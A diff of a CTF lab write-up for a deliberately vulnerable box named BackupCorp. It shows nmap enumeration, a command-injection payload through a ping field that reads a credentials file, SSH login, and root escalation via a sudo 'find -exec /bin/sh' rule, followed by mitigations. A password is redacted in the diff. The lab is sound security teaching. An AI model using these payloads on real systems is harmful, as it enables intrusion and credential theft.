@@ -10,25 +10,26 @@
 > **Author:** <your-thm-username>
 > **Skills:** enumeration · web command injection · credential looting · Linux privilege escalation (sudo / GTFOBins)
 
+> **Note:** Flag values and the leaked password are intentionally **blurred** in the
+> screenshots so this writeup doesn't spoil the room. Deploy the box and capture
+> them yourself.
+
 ---
 
 ## Overview
 
-BackupCorp takes its backups seriously — its security, not so much. In this box
-we enumerate the target, exploit an unsanitised **"Network Tools"** page to gain
-command execution, loot hardcoded credentials from a config file, pivot to a real
-user, and finish by abusing a careless `sudo` rule to escalate to **root**.
+BackupCorp takes its backups seriously — its security, not so much. In this box we
+enumerate the target, exploit an unsanitised **"Network Tools"** page to gain command
+execution, loot hardcoded credentials from a config file, pivot to a real user, and
+finish by abusing a careless `sudo` rule to escalate to **root**.
 
-> In the commands below, replace `<IP>` / `MACHINE_IP` with your deployed machine's
-> IP address.
+> In the commands below, replace the IP with your deployed machine's IP address.
 
 ---
 
 ## Task 1 — Deploy & Enumerate
 
-### Enumeration
-
-We start with a service/version scan:
+### Service scan
 
 ```bash
 nmap -sV -sC <IP>
@@ -40,11 +41,10 @@ Two ports are open:
 
 ```
 22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu
-80/tcp open  http     Apache httpd 2.4.52
+80/tcp open  http     Apache httpd 2.4.52 ((Ubuntu))
 ```
 
-Browsing to the web server shows the BackupCorp landing page, with a comment
-hinting at an admin area. Checking `robots.txt`:
+`nmap`'s `http-robots.txt` script already hints at one disallowed entry. Confirming it:
 
 ```bash
 curl http://<IP>/robots.txt
@@ -71,21 +71,15 @@ This points us at the hidden **/admin** directory.
 
 ## Task 2 — Get a Foothold
 
-Navigating to `http://<IP>/admin/` reveals a **Network Tools** page with a "Ping a
-host" field.
+Browsing to `http://<IP>/admin/` reveals a **Network Tools** page with a "Ping a host"
+field. It runs `ping` on whatever you submit — so if the input isn't sanitised, we can
+append our own command with `;`.
 
-![BackupCorp Network Tools ping page](images/03-admin-page.png)
+### Confirming command injection
 
-### Testing for command injection
+Submitting `127.0.0.1; id`:
 
-The page runs `ping` on whatever we submit. If the input isn't sanitised, we can
-chain our own command with `;`. Testing with `id`:
-
-```bash
-curl "http://<IP>/admin/index.php?host=127.0.0.1;id"
-```
-
-![command injection returning id output](images/04-injection-id.png)
+![command injection returning id output](images/03-injection-id.png)
 
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -93,21 +87,31 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Command injection confirmed — we execute as **www-data**.
 
-### Looting the config file
+### Enumerating the web directory
 
-There's a `config.php` in the admin folder. Reading a `.php` file **in the browser
-looks empty** because the browser hides the `<?php ... ?>` tags — so we read it with
-`curl` instead:
+Listing the admin folder (`127.0.0.1; ls /var/www/html/admin/`) shows a `config.php`:
+
+![listing the admin directory](images/05-ls-admin.png)
+
+### Reading config.php (the browser trap)
+
+Reading the `.php` file **in the browser looks empty** — the browser hides the
+`<?php ... ?>` tags, so nothing visibly renders:
+
+![config.php appears empty in the browser](images/04-browser-php-empty.png)
+
+The fix is to read it with `curl` from the terminal (View Source / base64 also work):
 
 ```bash
 curl "http://<IP>/admin/index.php?host=127.0.0.1;cat+/var/www/html/admin/config.php"
 ```
 
-![config.php credentials leaked via curl](images/05-config-creds.png)
+![config.php credentials leaked via curl](images/06-config-creds.png)
 
 ```php
+$db_host = "localhost";
 $db_user = "developer";
-$db_pass = "Sup3rS3cr3t_Backups!";
+$db_pass = "********************";   // (redacted in this writeup)
 ```
 
 We now have credentials for the user **developer**.
@@ -128,10 +132,13 @@ SSH is open, so we log in with the leaked credentials:
 
 ```bash
 ssh developer@<IP>
-# password: Sup3rS3cr3t_Backups!
 ```
 
-![SSH login as developer](images/06-ssh-login.png)
+![accepting the SSH host key](images/07-ssh-auth.png)
+
+After entering the password we land on the box as **developer**:
+
+![logged in as developer](images/08-ssh-login.png)
 
 Grab the user flag:
 
@@ -139,19 +146,13 @@ Grab the user flag:
 cat ~/user.txt
 ```
 
-![user.txt flag](images/07-user-flag.png)
-
-```
-THM{xxxxxxxxxxxxxxxxxxxxxxxx}
-```
-
-> _(Replace with your box's actual user.txt value.)_
+![user.txt flag (blurred)](images/09-user-flag.png)
 
 ### Questions
 
 | # | Question | Answer |
 |---|----------|--------|
-| 1 | Submit the contents of user.txt | `THM{...}` |
+| 1 | Submit the contents of user.txt | `THM{… deploy to find it …}` |
 
 ---
 
@@ -163,48 +164,55 @@ Check what `developer` can run as root:
 sudo -l
 ```
 
-![sudo -l output showing find](images/08-sudo-l.png)
+![sudo -l output showing find](images/10-sudo-l.png)
 
 ```
 User developer may run the following commands:
     (root) NOPASSWD: /usr/bin/find
 ```
 
-`find` can be run as root without a password. According to
-[GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo), `find` can spawn a shell
-via its `-exec` flag. Since we're running it as root, that shell is a **root shell**:
+`find` can be run as root without a password. [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
+shows that `find` can spawn a shell through its `-exec` flag:
+
+![GTFOBins find shell technique](images/11-gtfobins-find.png)
+
+Because we run it via `sudo`, that shell is a **root** shell:
 
 ```bash
 sudo /usr/bin/find . -exec /bin/sh \; -quit
 ```
 
-![root shell via sudo find](images/09-root-shell.png)
+![root shell via sudo find](images/12-root-shell.png)
+
+Confirming we're root:
+
+```bash
+id
+```
+
+![id confirming uid=0 root](images/13-id-root.png)
 
 ```
-# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Grab the root flag:
+Locate and read the root flag:
 
 ```bash
+ls /root/
 cat /root/root.txt
 ```
 
-![root.txt flag](images/10-root-flag.png)
+![listing /root](images/14-ls-root.png)
 
-```
-THM{xxxxxxxxxxxxxxxxxxxxxxxx}
-```
-
-> _(Replace with your box's actual root.txt value.)_
+![root.txt flag (blurred)](images/15-root-flag.png)
 
 ### Questions
 
 | # | Question | Answer |
 |---|----------|--------|
 | 1 | Which binary can developer run as root? | `/usr/bin/find` |
-| 2 | Submit the contents of root.txt | `THM{...}` |
+| 2 | Submit the contents of root.txt | `THM{… deploy to find it …}` |
 
 ---
 
@@ -225,10 +233,10 @@ of them would have broken the chain.
 ---
 
 ### Mitigations
-- **Validate/escape all user input** — never pass it to a shell. Use safe APIs
-  instead of `shell_exec`.
-- **Never hardcode credentials** in web-readable files; use environment variables or
-  a secrets manager, and restrict file permissions.
+- **Validate/escape all user input** — never pass it to a shell. Use safe APIs instead
+  of `shell_exec`.
+- **Never hardcode credentials** in web-readable files; use environment variables or a
+  secrets manager, and restrict file permissions.
 - **Follow least privilege for sudo** — don't grant `NOPASSWD` on binaries with known
   shell escapes (see GTFOBins).
 
